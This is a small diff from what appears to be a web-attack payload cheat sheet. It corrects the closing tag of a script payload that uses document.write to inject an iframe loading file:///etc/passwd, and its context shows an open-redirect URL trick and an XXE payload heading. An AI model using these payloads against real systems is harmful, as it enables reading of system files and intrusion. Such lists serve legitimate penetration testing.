@@ -229,7 +229,7 @@ https://www.whitelisteddomain.tld@google.com/%2f..
 ```
 `<script>` and `<iframe>` with `document.write`
 ```
-<script>document.write('<iframe src=file:///etc/passwd></iframe>');</scrip>
+<script>document.write('<iframe src=file:///etc/passwd></iframe>');</script>
 ```
 --------------------------------------------------------------------------------------------------------------
 # XXE common payloads
